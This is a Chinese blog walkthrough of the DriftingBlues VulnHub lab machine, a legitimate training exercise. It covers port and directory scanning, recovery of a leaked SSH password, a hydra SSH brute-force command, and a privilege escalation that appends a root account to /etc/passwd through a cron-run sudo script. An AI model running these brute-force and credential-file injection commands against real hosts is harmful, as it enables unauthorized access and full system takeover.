@@ -1,0 +1,115 @@
+<!doctype html><html lang=zh-cn itemscope itemtype=http://schema.org/WebPage><head><meta name=generator content="Hugo 0.121.2"><meta charset=utf-8><title>靶机：DriftingBlues · echo</title>
+<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=description content="nmap 10.9.23.0/24 扫描当前网段，确认靶机 IP：10.9.75.215 详细扫描 ┌──(root㉿kali)-[~] └─# nmap -sV -p- 10.9.23.215 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-13 16:53 CST Nmap scan report for"><meta name=keywords content="Hugo,Photography,Computer"><link rel=canonical href=https://www.inecho.cc/zh-cn/2024/01/13/%E9%9D%B6%E6%9C%BAdriftingblues/><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css integrity=sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO crossorigin=anonymous><link rel=stylesheet href=https://use.fontawesome.com/releases/v5.2.0/css/all.css integrity=sha384-hWVjflwFxL6sNzntih27bfxkr27PmbbK/iSvJ+a4+0owXq79v+lsFkW54bOGbiDQ crossorigin=anonymous><link rel=stylesheet href=https://www.inecho.cc/css/den.css></head><body><div class=header-container style=background:linear-gradient(rgba(0,0,0,.2),rgba(0,0,0,.2)),url(https://www.inecho.cc/images/background.jpg);background-position:50%;background-size:cover><div class=container><nav class="header-nav navbar navbar-expand-md navbar-dark light-dark"><div class="header-logo navbar-brand"><a class=float-left href=https://www.inecho.cc/zh-cn/><img class="mr20 header-logo-image" src=https://www.inecho.cc/images/globe.svg alt=logo>
+echo</a></div><button class=navbar-toggler type=button data-toggle=collapse data-target=#navbarNav aria-controls=navbarNav aria-expanded=false aria-label="Toggle navigation">
+<span class=navbar-toggler-icon></span></button><div class="nav-menu collapse navbar-collapse" id=navbarNav><ul class=navbar-nav><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/ideas/>思考</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/photography/>摄影</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/category/computer/>计算机</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/zh-cn/about/>关于</a></li><li class=nav-item><a class=nav-link href=https://www.inecho.cc/en/><i class="fas fa-globe"></i> English</a></li></ul></div></nav></div><div class="container header-wrapper"><div class=row><div class=col-lg-12><div class=header-content><h1 class=header-title>靶机：DriftingBlues</h1><p class=header-date>作者：
+Jack /
+2024-01-13
+/ 分类：
+<a href=https://www.inecho.cc/zh-cn/category/computer/>computer</a></p><div class=header-underline></div><div class=clearfix></div><p class="float-right header-tags"><i class="fas fa-tags" aria-hidden=true></i>
+<a href=https://www.inecho.cc/zh-cn/tag/vulnhub/>Vulnhub</a></p></div></div></div></div></div><main><div class="container content"><article><p><code>nmap 10.9.23.0/24</code> 扫描当前网段，确认靶机 IP：10.9.75.215</p><p><img src=img/20240113165133.png alt=image.png></p><p>详细扫描</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# nmap -sV -p- 10.9.23.215
+</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2024-01-13 16:53 CST
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> bogon <span class=o>(</span>10.9.23.215<span class=o>)</span>
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.010s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65533</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.18 <span class=o>((</span>Ubuntu<span class=o>))</span>
+</span></span><span class=line><span class=cl>MAC Address: 08:00:27:1F:2A:48 <span class=o>(</span>Oracle VirtualBox virtual NIC<span class=o>)</span>
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 32.62 seconds
+</span></span></code></pre></div><p>dirb探测隐藏目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# dirb http://10.9.23.215 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>DIRB v2.22    
+</span></span><span class=line><span class=cl>By The Dark Raver
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>START_TIME: Sat Jan <span class=m>13</span> 16:53:32 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>URL_BASE: http://10.9.23.215/
+</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---- Scanning URL: http://10.9.23.215/ ----
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/css/                                                                                          
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/img/                                                                                          
+</span></span><span class=line><span class=cl>+ http://10.9.23.215/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:7710<span class=o>)</span>                                                                            
+</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.215/js/                                                                                           
+</span></span><span class=line><span class=cl>+ http://10.9.23.215/server-status <span class=o>(</span>CODE:403<span class=p>|</span>SIZE:276<span class=o>)</span>                           
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/css/ ----
+</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
+</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/img/ ----
+</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
+</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>                                                     
+</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.215/js/ ----
+</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
+</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl>-----------------
+</span></span><span class=line><span class=cl>END_TIME: Sat Jan <span class=m>13</span> 16:53:55 <span class=m>2024</span>
+</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>4612</span> - FOUND: <span class=m>2</span>
+</span></span></code></pre></div><p>gobuster，探测隐藏目录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─# gobuster dir -u http://10.9.23.215 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Gobuster v3.6
+</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.9.23.215
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.6
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              php,html,txt,sh
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>/index.html           <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7710<span class=o>]</span>
+</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
+</span></span><span class=line><span class=cl>/img                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 308<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/img/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/css                  <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 308<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/css/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/js                   <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 307<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.215/js/<span class=o>]</span>
+</span></span><span class=line><span class=cl>/secret.html          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 25<span class=o>]</span>
+</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
+</span></span><span class=line><span class=cl>/server-status        <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
+</span></span><span class=line><span class=cl>Progress: <span class=m>1102800</span> / <span class=m>1102805</span> <span class=o>(</span>100.00%<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl><span class=nv>Finished</span>
+</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
+</span></span><span class=line><span class=cl>      
+</span></span></code></pre></div><p>首页F12找到信息
+<img src=img/20240113170818.png alt=image.png></p><p>使用base64解密一下，得到信息</p><p><img src=img/20240113170905.png alt=image.png></p><p>尝试在IP网址后加上访问，发现是使用ook混淆加密的密文
+<img src=img/20240113170938.png alt=image.png></p><p>在<a href=https://www.splitbrain.org/services/ook>解密网站</a>解密一下，提示我们使用host文件访问，并出现了eric
+<img src=img/20240113171051.png alt=image.png></p><p>结合首页频繁出现的信息
+<img src=img/20240113171425.png alt=image.png></p><p>在<code>vim /etc/host</code>文件中添加解析</p><p><img src=img/20240113171748.png alt=image.png></p><p>添加好后即可访问成功
+<img src=img/20240113172023.png alt=image.png></p><p>这里我们再尝试使用gobuster进行目录爆破
+使用gobuster进行本地域名爆破,这里如果出现错误无法扫描成功的话，重启一下靶机，再把刚刚填写上的数据删掉，再填写一次，最后再次尝试即可解决问题<code>gobuster host -u driftingblues.box -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt</code></p><p><img src=img/20240114143110.png alt=image.png></p><p>将test.driftingblues.box再写入host</p><p><img src=img/20240114143144.png alt=image.png></p><p>dirb 进行 web 目录扫描
+<img src=img/20240114163342.png alt=image.png></p><p>访问 robots.txt 页面
+<img src=img/20240114163400.png alt=image.png></p><p>再访问 / ssh_cred.txt，得到下面内容</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>we can use ssh password in case of emergency. it was &#34;1mw4ckyyucky&#34;.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>sheryl once told me that she added a number to the end of the password.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>-db
+</span></span></code></pre></div><p>使用 hydra 进行 ssh 暴力破解</p><pre tabindex=0><code>hydra -l eric -P pass.txt 192.168.132.158 ssh
+</code></pre><p><img src=img/20240114163623.png alt=image.png></p><p>这里我们尝试使用SSH远程登录
+<img src=img/20240114163247.png alt=image.png></p><p>找到第一个Flag
+<img src=img/20240114163654.png alt=image.png></p><p><strong>提权</strong></p><p>在<code>/var/backups</code> 目录下发现了一个<code>backup.sh</code>文件，查看该文件发现所属用户和组属性都为root权限
+<img src=img/20240114165010.png alt=image.png></p><p>查看该文件</p><p><img src=img/20240114165212.png alt=image.png></p><pre tabindex=0><code>这个脚本看起来是一个简单的备份脚本，它使用 `zip` 命令将 `/var/www/` 目录下的内容打包成一个压缩文件 `/tmp/backup.zip`。然后，它尝试使用 `/bin/chmod` 命令，但是缺少参数，因此这行命令可能有错误。
+
+另外，脚本的最后一行 `sudo /tmp/emergency` 表明它在 `/tmp/` 目录下执行了一个名为 `emergency` 的文件，并且可以用 sudo 去执行这个文件。
+
+因此这里我们可以在这个文件中写入 `echo &#34;jack:IGhvWxGrSeLnU:0:0::/root:/bin/bash&#34;&gt;&gt;/etc/passwd`这条命令，向/etc/passwd 文件中写入超级用户以提权（密码为jack）
+</code></pre><p>这里我们使用vi编辑器创建 emergency 文件，并写入创建用户命令</p><p><img src=img/20240114171316.png alt=image.png>
+创建写入成功后，<code>chmod +x emergency</code> 赋予其可执行权限</p><p>接下来可以使用 <a href=https://www.4hou.com/posts/JNKD>pspy</a> 来监听<code>backup.sh</code>进程，监听可知该进程是一个自动执行的进程</p><p>可以看到<code>backup.sh</code>文件已经帮我们写入成功了</p><p><img src=img/20240114171958.png alt=image.png></p><p>切换到jack用户，现在已经提权成功了</p><p><img src=img/20240114172121.png alt=image.png></p><p>夺旗 flag2</p><p><img src=img/20240114172521.png alt=image.png></p></article><div class=author-card><div class=underline></div><div class=author-box><div class=author-image><a href=/zh-cn><img src=/images/avatar.jpg alt=Jack></a></div><div class=author-content><p class=author-title>作者</p><p class=author-name>Jack</p><p class=author-desc>网络安全从业者，不知名三分熟摄影师。喜欢探索新领域，对摄影、电影和运动有极大兴趣，平时喜欢折腾一些无用但又有趣的东西。</p></div></div></div></div></main><div class="footer gradient-2"><div class="container footer-container"><div class=row><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>网站地图</div><ul class=list-unstyled><li><a href=https://www.inecho.cc/zh-cn/tags/>标签</a></li><li><a href=https://www.inecho.cc/zh-cn/categories/>分类</a></li><li><a rel=alternate type=application/rss+xml href=https://www.inecho.cc/zh-cn/index.xml><i class="fas fa-rss-square"></i> RSS 订阅</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>社群</div><ul class=list-unstyled><li><a href=https://github.com/shaform/hugo-theme-den/ rel=noopener target=_blank>GitHub</a></li></ul></div><div class="col-xs-4 col-sm-3 col-md-3 col-lg-3"><div class=footer-title>连结</div><ul class=list-unstyled><li><a href=https://github.com/shaform/hugo-theme-den/ rel=noopener target=_blank>关于我</a></li></ul></div><div class="col-xs-12 col-sm-3 col-md-3 col-lg-3"><p class="pull-right text-right"><small><em>Proudly powered by <a href=https://gohugo.io/ rel=noopener target=_blank>Hugo</a></em></small><br><small><em>Theme - <a href=https://github.com/shaform/hugo-theme-den rel=noopener target=_blank>Den</a></em></small><br><small>&copy;
+Jack
+2022 -
+2024</small></p></div></div></div></div><script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script><script src=https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js integrity=sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49 crossorigin=anonymous></script><script src=https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js integrity=sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy crossorigin=anonymous></script></body></html>
